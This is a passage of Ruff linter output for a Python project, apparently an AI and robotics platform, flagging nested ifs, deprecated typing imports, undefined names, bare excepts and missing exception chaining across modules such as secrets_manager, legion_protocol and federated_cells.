547 |                 "fused_context": asdict(fused_context) if fused_context else {},
    |                                  ^^^^^^
548 |                 "session_id": session_id,
549 |             }
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\guardian_approval_system.py:307:9
    |
306 |           # Check security implications
307 | /         if "security" in change_description.lower():
308 | |             if "security_review" not in metadata or not metadata.get("security_review"):
    | |________________________________________________________________________________________^
309 |                   violations.append("Security changes require security review")
310 |                   score -= 0.3
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\hardware_auto_discovery.py:569:13
    |
567 |           # Register new devices
568 |           for device in discovered_devices:
569 | /             if device.device_id not in [
570 | |                 d.device_id for d in self.registry.get_all_devices()
571 | |             ]:
572 | |                 # New device found
573 | |                 if self.registry.register_device(device):
574 | |                     # Probe device
575 | |                     if self.discovery_protocol.probe_device(device):
    | |____________________________________________________________________^
576 |                           self.registry.update_device_status(
577 |                               device.device_id, HardwareStatus.READY
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\hardware_auto_discovery.py:573:17
    |
571 |               ]:
572 |                   # New device found
573 | /                 if self.registry.register_device(device):
574 | |                     # Probe device
575 | |                     if self.discovery_protocol.probe_device(device):
    | |____________________________________________________________________^
576 |                           self.registry.update_device_status(
577 |                               device.device_id, HardwareStatus.READY
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\hydra_50_engine.py:201:9
    |
199 |                       f"{self.variable_name} cannot exceed ceiling of {self.locked_value} (locked: {self.reason})",
200 |                   )
201 | /         elif self.constraint_type == "floor":
202 | |             if new_value < self.locked_value:
    | |_____________________________________________^
203 |                   return (
204 |                       False,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> src\app\core\hydra_50_engine.py:4497:13
     |
4495 |                           activated.append(target_id)
4496 |
4497 | /             elif coupling.coupling_type == "synchronizing":
4498 | |                 # Synchronize escalation levels
4499 | |                 if (
4500 | |                     target.escalation_level.value
4501 | |                     < source_scenario.escalation_level.value
4502 | |                 ):
     | |__________________^
4503 |                       target.escalation_level = EscalationLevel(
4504 |                           min(source_scenario.escalation_level.value, 5)
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> src\app\core\hydra_50_engine.py:4828:9
     |
4826 |                   )
4827 |
4828 | /         elif scenario.category == ScenarioCategory.SOCIETAL:
4829 | |             # Social cohesion and legitimacy never fully recover
4830 | |             if (
4831 | |                 "legitimacy_collapse" in triggered_collapses
4832 | |                 or "social_fracture" in triggered_collapses
4833 | |             ):
     | |______________^
4834 |                   constraints.append(
4835 |                       VariableConstraint(
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> src\app\core\hydra_50_engine.py:4897:9
     |
4895 |                   )
4896 |
4897 | /         elif scenario.category == ScenarioCategory.SOCIETAL:
4898 | |             if "legitimacy_collapse" in triggered_collapses:
     | |____________________________________________________________^
4899 |                   disabled.append(
4900 |                       DisabledRecoveryEvent(
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\identity_operational_extensions.py:252:9
    |
251 |           # For implicit consent, require additional validation
252 | /         if consent_level == ConsentLevel.IMPLICIT_CONSENT:
253 | |             if not context.get("behavioral_evidence", False):
    | |_____________________________________________________________^
254 |                   return False, "Implicit consent requires behavioral evidence"
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\incident_responder.py:296:9
    |
294 |               actions.append(ResponseAction.QUARANTINE_FILE.value)
295 |
296 | /         if "brute" in incident_type or "password" in incident_type:
297 | |             if incident.source_ip:
    | |__________________________________^
298 |                   actions.append(ResponseAction.BLOCK_IP.value)
    |
help: Combine `if` statements using `and`

B027 `GovernanceEngineInterface.initialize` is an empty method in an abstract base class, but has no abstract decorator
  --> src\app\core\interfaces.py:75:5
   |
73 |           """
74 |
75 | /     def initialize(self) -> None:
76 | |         """
77 | |         Initialize the governance engine (optional hook).
78 | |
79 | |         Override this method if your engine needs initialization logic.
80 | |         """
   | |___________^
81 |
82 |       def shutdown(self) -> None:
   |

B027 `GovernanceEngineInterface.shutdown` is an empty method in an abstract base class, but has no abstract decorator
  --> src\app\core\interfaces.py:82:5
   |
80 |           """
81 |
82 | /     def shutdown(self) -> None:
83 | |         """
84 | |         Shutdown the governance engine (optional hook).
85 | |
86 | |         Override this method if your engine needs cleanup logic.
87 | |         """
   | |___________^
   |

B027 `MemoryEngineInterface.initialize` is an empty method in an abstract base class, but has no abstract decorator
   --> src\app\core\interfaces.py:167:5
    |
165 |           """
166 |
167 | /     def initialize(self) -> None:
168 | |         """
169 | |         Initialize the memory engine (optional hook).
170 | |
171 | |         Override this method if your engine needs initialization logic.
172 | |         """
    | |___________^
173 |
174 |       def shutdown(self) -> None:
    |

B027 `MemoryEngineInterface.shutdown` is an empty method in an abstract base class, but has no abstract decorator
   --> src\app\core\interfaces.py:174:5
    |
172 |           """
173 |
174 | /     def shutdown(self) -> None:
175 | |         """
176 | |         Shutdown the memory engine (optional hook).
177 | |
178 | |         Override this method if your engine needs cleanup logic.
179 | |         """
    | |___________^
180 |
181 |       def add_memory(
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\ip_blocking_system.py:160:17
    |
158 |               if ip_address in self.ip_records:
159 |                   record = self.ip_records[ip_address]
160 | /                 if record.blocked:
161 | |                     # Check if block has expired
162 | |                     if record.block_timestamp:
    | |______________________________________________^
163 |                           block_time = datetime.fromisoformat(record.block_timestamp)
164 |                           if datetime.now(UTC) - block_time > self.block_duration:
    |
help: Combine `if` statements using `and`

F401 [*] `json` imported but unused
  --> src\app\core\legion_protocol.py:8:8
   |
 6 | """
 7 |
 8 | import json
   |        ^^^^
 9 | import logging
10 | from datetime import datetime, timezone
   |
help: Remove unused import: `json`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\app\core\legion_protocol.py:11:1
   |
 9 | import logging
10 | from datetime import datetime, timezone
11 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
12 |
13 | from app.core.ai_systems import AIPersona, EntityClass, FourLaws
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\core\legion_protocol.py:11:1
   |
 9 | import logging
10 | from datetime import datetime, timezone
11 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
12 |
13 | from app.core.ai_systems import AIPersona, EntityClass, FourLaws
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\core\legion_protocol.py:11:1
   |
 9 | import logging
10 | from datetime import datetime, timezone
11 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
12 |
13 | from app.core.ai_systems import AIPersona, EntityClass, FourLaws
   |

F401 [*] `typing.List` imported but unused
  --> src\app\core\legion_protocol.py:11:41
   |
 9 | import logging
10 | from datetime import datetime, timezone
11 | from typing import Any, Callable, Dict, List, Optional
   |                                         ^^^^
12 |
13 | from app.core.ai_systems import AIPersona, EntityClass, FourLaws
   |
help: Remove unused import: `typing.List`

F401 [*] `app.core.shadow_types.ShadowMode` imported but unused
  --> src\app\core\legion_protocol.py:17:5
   |
15 | from app.core.shadow_types import (
16 |     InvariantDefinition,
17 |     ShadowMode,
   |     ^^^^^^^^^^
18 |     create_identity_invariant,
19 | )
   |
help: Remove unused import: `app.core.shadow_types.ShadowMode`

UP045 [*] Use `X | None` for type annotations
  --> src\app\core\legion_protocol.py:70:51
   |
69 |     def verify_action(
70 |         self, action_callable: Callable, context: Optional[Dict] = None
   |                                                   ^^^^^^^^^^^^^^
71 |     ) -> Dict[str, Any]:
72 |         """Runs the action through Shadow Thirst speculative execution."""
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\legion_protocol.py:70:60
   |
69 |     def verify_action(
70 |         self, action_callable: Callable, context: Optional[Dict] = None
   |                                                            ^^^^
71 |     ) -> Dict[str, Any]:
72 |         """Runs the action through Shadow Thirst speculative execution."""
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\legion_protocol.py:71:10
   |
69 |     def verify_action(
70 |         self, action_callable: Callable, context: Optional[Dict] = None
71 |     ) -> Dict[str, Any]:
   |          ^^^^
72 |         """Runs the action through Shadow Thirst speculative execution."""
73 |         trace_id = f"legion_verify_{datetime.now(timezone.utc).timestamp()}"
   |
help: Replace with `dict`

UP017 [*] Use `datetime.UTC` alias
  --> src\app\core\legion_protocol.py:73:50
   |
71 |     ) -> Dict[str, Any]:
72 |         """Runs the action through Shadow Thirst speculative execution."""
73 |         trace_id = f"legion_verify_{datetime.now(timezone.utc).timestamp()}"
   |                                                  ^^^^^^^^^^^^
74 |
75 |         # Define invariants for Legion's global representation
   |
help: Convert to `datetime.UTC` alias

UP045 [*] Use `X | None` for type annotations
   --> src\app\core\legion_protocol.py:148:37
    |
147 |     def process_request(
148 |         self, prompt: str, context: Optional[Dict] = None
    |                                     ^^^^^^^^^^^^^^
149 |     ) -> Dict[str, Any]:
150 |         """Main interaction flow for Legion."""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\legion_protocol.py:148:46
    |
147 |     def process_request(
148 |         self, prompt: str, context: Optional[Dict] = None
    |                                              ^^^^
149 |     ) -> Dict[str, Any]:
150 |         """Main interaction flow for Legion."""
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\legion_protocol.py:149:10
    |
147 |     def process_request(
148 |         self, prompt: str, context: Optional[Dict] = None
149 |     ) -> Dict[str, Any]:
    |          ^^^^
150 |         """Main interaction flow for Legion."""
151 |         # Define a lambda that represents the response generation for shadow validation
    |
help: Replace with `dict`

E731 Do not assign a `lambda` expression, use a `def`
   --> src\app\core\legion_protocol.py:152:9
    |
150 |           """Main interaction flow for Legion."""
151 |           # Define a lambda that represents the response generation for shadow validation
152 | /         action_callable = (
153 | |             lambda: f"As an Ambassador, I provide this guidance: {self.threshold.guide_user_toward_genesis(prompt)}"
154 | |         )
    | |_________^
155 |
156 |           # 1. Shadow Thirst Verification
    |
help: Rewrite `action_callable` as a `def`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\memory_optimization\tiered_storage.py:599:25
    |
597 |                   with self.access_lock:
598 |                       for key, pattern in self.access_patterns.items():
599 | /                         if pattern.current_tier == StorageTier.COLD:
600 | |                             if pattern.get_idle_hours() > threshold_hours:
    | |__________________________________________________________________________^
601 |                                   keys_to_prune.append(key)
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\operational_substructure.py:282:9
    |
280 |               return False, "This decision requires human authorization"
281 |
282 | /         if authority.authorization_level == AuthorizationLevel.APPROVAL_REQUIRED:
283 | |             if not context or not context.get("approval_granted"):
    | |__________________________________________________________________^
284 |                   return False, "This decision requires approval before execution"
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\operational_substructure.py:289:17
    |
287 |           if context:
288 |               for constraint_key, constraint_value in authority.constraints.items():
289 | /                 if constraint_key in context:
290 | |                     if context[constraint_key] != constraint_value:
    | |___________________________________________________________________^
291 |                           return (
292 |                               False,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\operational_substructure.py:321:9
    |
319 |           self.decision_log.append(log_entry)
320 |
321 | /         if decision_type in self.authorities:
322 | |             if self.authorities[decision_type].audit_required:
    | |______________________________________________________________^
323 |                   logger.info(
324 |                       "[%s] Decision: %s - %s",
    |
help: Combine `if` statements using `and`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\core\per_service_retry_tracker.py:15:1
   |
13 | from dataclasses import dataclass
14 | from datetime import datetime
15 | from typing import Dict, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
16 |
17 | logger = logging.getLogger(__name__)
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\per_service_retry_tracker.py:54:32
   |
53 |         # Service-specific counters
54 |         self.service_counters: Dict[str, int] = defaultdict(int)
   |                                ^^^^
55 |         self.global_counter = 0
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\per_service_retry_tracker.py:58:31
   |
57 |         # Service configurations
58 |         self.service_configs: Dict[str, ServiceRetryConfig] = {}
   |                               ^^^^
59 |
60 |         # Circuit breaker states
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\per_service_retry_tracker.py:61:40
   |
60 |         # Circuit breaker states
61 |         self.circuit_breaker_failures: Dict[str, int] = defaultdict(int)
   |                                        ^^^^
62 |         self.circuit_breaker_states: Dict[str, str] = defaultdict(lambda: "CLOSED")
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\per_service_retry_tracker.py:62:38
   |
60 |         # Circuit breaker states
61 |         self.circuit_breaker_failures: Dict[str, int] = defaultdict(int)
62 |         self.circuit_breaker_states: Dict[str, str] = defaultdict(lambda: "CLOSED")
   |                                      ^^^^
63 |
64 |         # Thread safety
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\per_service_retry_tracker.py:194:55
    |
192 |                 logger.info(f"Circuit breaker CLOSED for '{service_name}' (success)")
193 |
194 |     def get_service_stats(self, service_name: str) -> Dict:
    |                                                       ^^^^
195 |         """
196 |         Get statistics for a specific service.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\per_service_retry_tracker.py:221:35
    |
219 |             }
220 |
221 |     def get_global_stats(self) -> Dict:
    |                                   ^^^^
222 |         """
223 |         Get global retry statistics.
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\core\per_service_retry_tracker.py:281:24
    |
280 | # Global instance
281 | _global_retry_tracker: Optional[PerServiceRetryTracker] = None
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\platform_tiers.py:333:9
    |
331 |                       f"Tier 2 components must have CONSTRAINED authority, got {authority}"
332 |                   )
333 | /         elif tier == PlatformTier.TIER_3_APPLICATION:
334 | |             if authority != AuthorityLevel.SANDBOXED:
    | |_____________________________________________________^
335 |                   raise ValueError(
336 |                       f"Tier 3 components must have SANDBOXED authority, got {authority}"
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\platform_tiers.py:355:13
    |
354 |               # Tier 1 cannot depend on Tier 2/3
355 | /             if tier == PlatformTier.TIER_1_GOVERNANCE:
356 | |                 if dep_component.tier != PlatformTier.TIER_1_GOVERNANCE:
    | |________________________________________________________________________^
357 |                       violation = TierBoundaryViolation(
358 |                           violation_id=f"dep_{len(self._violations)}",
    |
help: Combine `if` statements using `and`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\core\polyglot_execution.py:730:13
    |
729 |         except Exception as e:
730 |             raise RuntimeError(f"OpenAI execution failed: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
731 |
732 |     def _execute_huggingface(
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\core\polyglot_execution.py:787:13
    |
786 |         except Exception as e:
787 |             raise RuntimeError(f"HuggingFace execution failed: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
788 |
789 |     # ========================================================================
    |

F821 Undefined name `openai`
   --> src\app\core\rag_system.py:472:20
    |
470 |                     "provider": provider,
471 |                 }
472 |             except openai.RateLimitError as e:
    |                    ^^^^^^
473 |                 logger.error("OpenAI rate limit exceeded: %s", e)
474 |                 return {
    |

F821 Undefined name `openai`
   --> src\app\core\rag_system.py:480:20
    |
478 |                     "error": "rate_limit",
479 |                 }
480 |             except openai.AuthenticationError as e:
    |                    ^^^^^^
481 |                 logger.error("OpenAI authentication failed: %s", e)
482 |                 return {
    |

F821 Undefined name `openai`
   --> src\app\core\rag_system.py:488:20
    |
486 |                     "error": "authentication",
487 |                 }
488 |             except openai.APITimeoutError as e:
    |                    ^^^^^^
489 |                 logger.error("OpenAI API timeout: %s", e)
490 |                 return {
    |

F821 Undefined name `openai`
   --> src\app\core\rag_system.py:496:20
    |
494 |                     "error": "timeout",
495 |                 }
496 |             except openai.APIError as e:
    |                    ^^^^^^
497 |                 logger.error("OpenAI API error: %s", e)
498 |                 return {
    |

F821 Undefined name `CommunicationProtocol`
   --> src\app\core\robotic_controller_manager.py:595:36
    |
593 |             max_payload=5.0,
594 |             max_reach=1.5,
595 |             communication_protocol=CommunicationProtocol.USB,
    |                                    ^^^^^^^^^^^^^^^^^^^^^
596 |         )
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\robotic_hardware_layer.py:428:9
    |
427 |           # Second Law: Obey human orders (unless conflicts with First/Zeroth)
428 | /         if context.get("is_user_order"):
429 | |             if context.get("order_conflicts_with_first"):
    | |_________________________________________________________^
430 |                   return False, "FOUR LAWS VIOLATION: Order conflicts with First Law"
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\robotic_hardware_layer.py:433:9
    |
432 |           # Third Law: Self-preservation (unless conflicts with First/Second)
433 | /         if context.get("endangers_robot"):
434 | |             if not context.get("preserves_human_safety"):
    | |_________________________________________________________^
435 |                   logger.warning("Robot self-preservation: Action endangers robot")
    |
help: Combine `if` statements using `and`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\core\secrets_manager.py:174:13
    |
172 |               )
173 |           except Exception as e:
174 | /             raise ConfigurationError(
175 | |                 f"Invalid encryption key: {e}", original_exception=e
176 | |             )
    | |_____________^
177 |
178 |           # Load existing secrets
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\core\secrets_manager.py:298:13
    |
296 |           except Exception as e:
297 |               logger.error(f"Failed to load secrets: {e}")
298 | /             raise ConfigurationError(
299 | |                 f"Failed to load secrets from {self.storage_path}: {e}",
300 | |                 original_exception=e,
301 | |             )
    | |_____________^
302 |
303 |       def _save_secrets(self) -> None:
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\core\secrets_manager.py:336:13
    |
334 |           except Exception as e:
335 |               logger.error(f"Failed to save secrets: {e}")
336 | /             raise ConfigurationError(
337 | |                 f"Failed to save secrets to {self.storage_path}: {e}",
338 | |                 original_exception=e,
339 | |             )
    | |_____________^
    |

SIM102 Use a single `if` statement instead of nested `if` statements
    --> src\app\core\secure_comms.py:1021:9
     |
1019 |       def validate_config(self, config: dict[str, Any]) -> tuple[bool, str | None]:
1020 |           """Validate configuration"""
1021 | /         if "consensus_quorum" in config:
1022 | |             if not 0.5 < config["consensus_quorum"] <= 1.0:
     | |___________________________________________________________^
1023 |                   return False, "consensus_quorum must be between 0.5 and 1.0"
1024 |           return True, None
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\security_operations_center.py:193:13
    |
192 |               # Simple pattern matching
193 | /             if "event_type" in conditions:
194 | |                 if event.event_type != conditions["event_type"]:
    | |________________________________________________________________^
195 |                       return False
    |
help: Combine `if` statements using `and`

F821 Undefined name `time`
   --> src\app\core\security_validator.py:535:28
    |
533 |         self.capacity = capacity
534 |         self.tokens = capacity
535 |         self.last_update = time.time()
    |                            ^^^^
536 |         self._lock = threading.Lock()
    |

F821 Undefined name `threading`
   --> src\app\core\security_validator.py:536:22
    |
534 |         self.tokens = capacity
535 |         self.last_update = time.time()
536 |         self._lock = threading.Lock()
    |                      ^^^^^^^^^
537 |
538 |     def allow_request(self, cost: float = 1.0) -> bool:
    |

N806 Variable `R` in function should be lowercase
   --> src\app\core\sensor_fusion.py:246:9
    |
244 |             measurement_noise: Optional measurement noise covariance
245 |         """
246 |         R = measurement_noise if measurement_noise is not None else self.R
    |         ^
247 |
248 |         # Innovation
    |

N806 Variable `S` in function should be lowercase
   --> src\app\core\sensor_fusion.py:252:9
    |
251 |         # Innovation covariance
252 |         S = self.H @ self.P @ self.H.T + R
    |         ^
253 |
254 |         # Kalman gain
    |

N806 Variable `K` in function should be lowercase
   --> src\app\core\sensor_fusion.py:255:9
    |
254 |         # Kalman gain
255 |         K = self.P @ self.H.T @ np.linalg.inv(S)
    |         ^
256 |
257 |         # Update state
    |

N806 Variable `I` in function should be lowercase
   --> src\app\core\sensor_fusion.py:261:9
    |
260 |         # Update covariance
261 |         I = np.eye(6)
    |         ^
262 |         self.P = (I - K @ self.H) @ self.P
    |

E741 Ambiguous variable name: `I`
   --> src\app\core\sensor_fusion.py:261:9
    |
260 |         # Update covariance
261 |         I = np.eye(6)
    |         ^
262 |         self.P = (I - K @ self.H) @ self.P
    |

N818 Exception name `ShadowResourceViolation` should be named with an Error suffix
  --> src\app\core\shadow_resource_limiter.py:43:7
   |
43 | class ShadowResourceViolation(RuntimeError):
   |       ^^^^^^^^^^^^^^^^^^^^^^^
44 |     """
45 |     Raised when a shadow callable exceeds its CPU or memory quota.
   |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\simulation_contingency_root.py:311:9
    |
309 |           """
310 |           # Check if mutable access is allowed
311 | /         if cls._projection_mode and not from_monolith:
312 | |             if cls._monolith_authority is not None:
    | |___________________________________________________^
313 |                   # Request authorization from monolith
314 |                   from engines.alien_invaders.modules.planetary_defense_monolith import (
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\simulation_contingency_root.py:362:9
    |
361 |           # Check if mutable access is requested
362 | /         if mutable and cls._projection_mode and not from_monolith:
363 | |             if cls._monolith_authority is not None:
    | |___________________________________________________^
364 |                   # Request authorization from monolith
365 |                   from engines.alien_invaders.modules.planetary_defense_monolith import (
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\simulation_contingency_root.py:411:9
    |
409 |           """
410 |           # Check if mutable access is allowed
411 | /         if cls._projection_mode and not from_monolith:
412 | |             if cls._monolith_authority is not None:
    | |___________________________________________________^
413 |                   # Request authorization from monolith
414 |                   from engines.alien_invaders.modules.planetary_defense_monolith import (
    |
help: Combine `if` statements using `and`

E741 Ambiguous variable name: `l`
   --> src\app\core\tier_performance_monitor.py:522:50
    |
520 |         levels = [r.performance_level for r in reports]
521 |
522 |         if any(l == PerformanceLevel.FAILING for l in levels):
    |                                                  ^
523 |             return PerformanceLevel.FAILING
524 |         elif any(l == PerformanceLevel.CRITICAL for l in levels):
    |

E741 Ambiguous variable name: `l`
   --> src\app\core\tier_performance_monitor.py:524:53
    |
522 |         if any(l == PerformanceLevel.FAILING for l in levels):
523 |             return PerformanceLevel.FAILING
524 |         elif any(l == PerformanceLevel.CRITICAL for l in levels):
    |                                                     ^
525 |             return PerformanceLevel.CRITICAL
526 |         elif any(l == PerformanceLevel.DEGRADED for l in levels):
    |

E741 Ambiguous variable name: `l`
   --> src\app\core\tier_performance_monitor.py:526:53
    |
524 |         elif any(l == PerformanceLevel.CRITICAL for l in levels):
525 |             return PerformanceLevel.CRITICAL
526 |         elif any(l == PerformanceLevel.DEGRADED for l in levels):
    |                                                     ^
527 |             return PerformanceLevel.DEGRADED
528 |         else:
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\core\unified_integration_bus.py:465:17
    |
463 |                   raise
464 |               except Exception as e:
465 | /                 raise ValidationError(
466 | |                     f"Input validation failed: {e}",
467 | |                     context={"service_id": service_id},
468 | |                     original_exception=e,
469 | |                 )
    | |_________________^
470 |
471 |           # Get service descriptor
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\core\unified_integration_bus.py:506:21
    |
504 |                           f"{service_id} - {e}"
505 |                       )
506 | /                     raise SubsystemError(
507 | |                         f"Service request failed: {service_id}",
508 | |                         error_code="SERVICE_REQUEST_FAILED",
509 | |                         context={
510 | |                             "service_id": service_id,
511 | |                             "attempts": policy.max_attempts,
512 | |                             "trace_id": child_ctx.trace_id,
513 | |                         },
514 | |                         original_exception=e,
515 | |                     )
    | |_____________________^
516 |
517 |                   # Wait before retry
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\core\unified_integration_bus.py:566:21
    |
564 |                       return future.result(timeout=timeout)
565 |                   except concurrent.futures.TimeoutError:
566 | /                     raise TimeoutError(
567 | |                         f"Service request timed out: {descriptor.service_id}",
568 | |                         context={
569 | |                             "service_id": descriptor.service_id,
570 | |                             "timeout": timeout,
571 | |                             "trace_id": trace_ctx.trace_id,
572 | |                         },
573 | |                     )
    | |_____________________^
574 |           else:
575 |               raise SubsystemError(
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\unified_integration_bus.py:652:13
    |
650 |           """
651 |           with self._lock:
652 | /             if event_type in self._event_subscribers:
653 | |                 if subscriber in self._event_subscribers[event_type]:
    | |_____________________________________________________________________^
654 |                       self._event_subscribers[event_type].remove(subscriber)
655 |                       logger.debug(f"Unsubscribed from event type: {event_type}")
    |
help: Combine `if` statements using `and`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\core\unified_integration_bus.py:738:13
    |
736 |             raise
737 |         except Exception as e:
738 |             raise ValidationError(f"Validation failed: {e}", original_exception=e)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
739 |
740 |     # Lifecycle Management
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
  --> src\app\core\utils\secure_storage.py:33:13
   |
31 |         except Exception as e:
32 |             logger.error(f"Invalid Fernet key: {e}")
33 |             raise ValueError("Invalid encryption key provided.")
   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
34 |
35 |     def save_encrypted_json(self, file_path: str, data: Any):
   |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\visual_bonding_controller.py:182:21
    |
180 |                   # Compare with ground truth if available
181 |                   if ground_truth:
182 | /                     if "emotion" in ground_truth:
183 | |                         if ground_truth["emotion"] == cue_data.emotion.value:
    | |_____________________________________________________________________________^
184 |                               score.emotion_accuracy = min(
185 |                                   1.0, score.emotion_accuracy + 0.05
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\visual_bonding_controller.py:188:21
    |
186 |                               )
187 |
188 | /                     if "focus_level" in ground_truth:
189 | |                         if ground_truth["focus_level"] == cue_data.focus_level.value:
    | |_____________________________________________________________________________________^
190 |                               score.focus_accuracy = min(1.0, score.focus_accuracy + 0.05)
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\visual_bonding_controller.py:243:25
    |
241 |                           )
242 |
243 | /                         if cue_data and "emotion" in truth:
244 | |                             if cue_data.emotion.value == truth["emotion"]:
    | |__________________________________________________________________________^
245 |                                   correct_count += 1
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\deployment\federated_cells.py:720:21
    |
718 |                   updates_to_apply = {}
719 |                   for cell_id, health_data in peer_health.items():
720 | /                     if cell_id in self.cell_health:
721 | |                         # Only update if peer data is newer
722 | |                         if (
723 | |                             health_data["last_heartbeat"]
724 | |                             > self.cell_health[cell_id].last_heartbeat
725 | |                         ):
    | |__________________________^
726 |                               updates_to_apply[cell_id] = health_data
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\deployment\federated_cells.py:902:17
    |
900 |           while self.running:
901 |               try:
902 | /                 if self.cell_identity.role == CellRole.FOLLOWER:
903 | |                     # Check election timeout
904 | |                     if time.time() - self.last_heartbeat > self.election_timeout:
    | |_________________________________________________________________________________^
905 |                           self._start_election()
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\deployment\federated_cells.py:933:21
    |
931 |                       is_healthy = self._check_health(cell_id)
932 |
933 | /                     if not is_healthy:
934 | |                         # Mark cell as degraded or failing
935 | |                         if cell_id in self.cells:
    | |_________________________________________________^
936 |                               failures = self.cell_health[cell_id].consecutive_failures
937 |                               if failures > 3:
    |
help: Combine `if` statements using `and`

E722 Do not use bare `except`
  --> src\app\domains\continuous_improvement.py:80:9
   |
78 |             self._initialized = True
79 |             return True
80 |         except:
   |         ^^^^^^
81 |             return False
   |

E722 Do not use bare `except`
   --> src\app\domains\continuous_improvement.py:165:9
    |
163 |             with open(self.data_path / "state.json", "w") as f:
